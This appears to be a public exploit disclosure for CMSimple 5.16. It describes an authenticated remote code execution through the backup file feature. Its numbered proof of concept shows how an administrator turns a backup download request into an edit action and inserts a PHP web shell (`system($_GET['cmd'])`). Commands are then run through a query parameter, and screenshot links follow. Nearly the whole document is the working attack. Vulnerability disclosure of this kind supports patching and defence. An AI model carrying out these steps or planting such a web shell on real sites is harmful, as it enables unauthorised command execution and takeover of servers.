
## Basic Info

- **Exploit Title:** CMSimple 5.16 backup file RCE (Authenticated)
- **Exploit Author:** h4ckr4v3n
- **Vendor Homepage:** https://www.cmsimple.org/
- **Version:** 5.16
- **Tested on:** Ubuntu 22.04/PHP 7.4/Nginx 1.18.0

## Description
Functionality of downloading php backup files in CMSimple 5.16 allows a user with administrator rights to inject and execute arbitrary php code

## Proof of Concept

1) Log In as Administrator.
2) Navigate to "Backup" tab.
3) Click on "download" button near content or pagedata file and intercept outgoing request.
4) Change GET request `/?file=content&action=download` to    `/?file=content&action=edit`
5) In code editor delete PHP-code to access file directly and put your payload: `<?php system($_GET['cmd']);?>`
6) Save file.
7) Now you can execute commands via cmd parameter: `/content/content.php?cmd=id`
![cmsimpl_backup_rce1](https://github.com/user-attachments/assets/b239704d-e2be-4ca7-a5a5-b9551236ff6c)
![cmsimpl_backup_rce2](https://github.com/user-attachments/assets/62a45dfd-e796-4427-991f-abded87cf7f6)
![cmsimpl_backup_rce3](https://github.com/user-attachments/assets/eae8df71-8538-4f8d-a805-def91e9ddbc2)
![cmsimpl_backup_rce4](https://github.com/user-attachments/assets/b6cb759c-5e51-4c68-a148-a51133fd1159)
